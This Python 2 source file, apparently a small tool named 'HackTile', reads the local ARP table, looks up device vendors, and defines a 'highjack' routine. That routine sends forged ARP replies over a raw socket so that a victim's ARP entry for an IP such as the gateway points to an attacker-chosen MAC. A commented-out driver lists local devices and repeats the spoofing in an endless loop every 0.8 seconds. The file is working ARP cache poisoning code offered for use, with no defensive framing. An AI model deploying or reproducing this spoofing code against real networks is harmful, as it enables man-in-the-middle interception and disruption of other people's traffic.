#!/bin/python
'''
Created on 18.09.2016

@author: maxbit89
'''
import urllib2
import json
import codecs
import arptable
import socket
import struct
import netifaces
import time
import sys

ARPOP_REPLY                   = struct.pack('!H', 0x0002)
ETHERNET_PROTOCOL_TYPE_ARP    = struct.pack('!H', 0x0806)
ARP_PROTOCOL_TYPE_ETHERNET_IP = struct.pack('!HHBB', 0x0001, 0x0800, 0x0006, 0x0004)
ZERO_MAC                      = struct.pack('!6B', *(0x00,)*6)
BROADCAST_MAC                 = struct.pack('!6B', *(0xFF,)*6)
ZERO_IP                       = struct.pack('!4B', *(0x00,)*4)

class arputils:
    def __init__(self, devicename):
        #open raw socket:
        self._dev = devicename
        self._sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
        self._sock.bind((self._dev, socket.SOCK_RAW))
        
    def getMacVendor(self, str_macAddr):
        url = "https://macvendors.co/api/"
        
        request = urllib2.Request(url+str_macAddr, headers={'User-Agent' : "API Browser"})
        response = urllib2.urlopen(request)
        #Fix: json object must be str, not 'bytes'
        reader = codecs.getreader("utf-8")
        obj = json.load(reader(response))

        #Print company name
        return obj['result']['company']
    
    def getArp(self):
        arps = arptable.get_arp_table()
        for arp in arps:
            arp["vendor"] = self.getMacVendor(arp['HW address'])
        return arps
    
    def getOwnMac(self):
        return self._formatMacToString(self._sock.getsockname()[4])
    
    def getOwnIp(self):
        return netifaces.ifaddresses(self._dev)[2][0]['addr']
    
    def _formatMacToString(self, mac):
        return "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac)
    
    def _formatStringToIp(self, strip):
        return socket.inet_aton(strip)
    
    def _formatStringToMac(self, strmac):
        return strmac.replace(':', '').decode('hex');
    
    def highjack(self, ip_spoof, mac_redirectto, mac_victim):
        _mac_victim = self._formatStringToMac(mac_victim)
        _mac_redirectto = self._formatStringToMac(mac_redirectto)
        _ip_spoof = self._formatStringToIp(ip_spoof)
        
        arpframe = [
             # ## ETHERNET
             # destination MAC addr
             _mac_victim,
             # source MAC addr
             _mac_redirectto,
             ETHERNET_PROTOCOL_TYPE_ARP,
             # ## ARP
             ARP_PROTOCOL_TYPE_ETHERNET_IP,
             # operation type
             ARPOP_REPLY,
             # sender MAC addr
             _mac_redirectto,
             # sender IP addr
             _ip_spoof,
             # target hardware addr
             _mac_victim,
             # target IP addr
             ZERO_IP
        ]
        self._sock.send(''.join(arpframe))
    def highjackArpEntry(self, spoof_ip, mac_redirectto, arp):
        self.highjack(spoof_ip, mac_redirectto, arp['HW address'])
        

#c = arputils("enp0s3")
#print "HackTile! v0.0.1"
#print "own Mac:["+c.getOwnMac()+"]own IP:["+c.getOwnIp()+"]"
#print "ARP ENTRIES:"
#arp = c.getArp()
#for a in arp:
#    sys.stdout.write("\xE2\x98\xA0 ")
#    sys.stdout.write(a['IP address']+" "+a['HW address']+" --> "+a['vendor']+"\n")
#
#while(1):
#    print "Highjack"
#    c.highjack("192.168.0.1", "", "")
#    time.sleep(0.8)
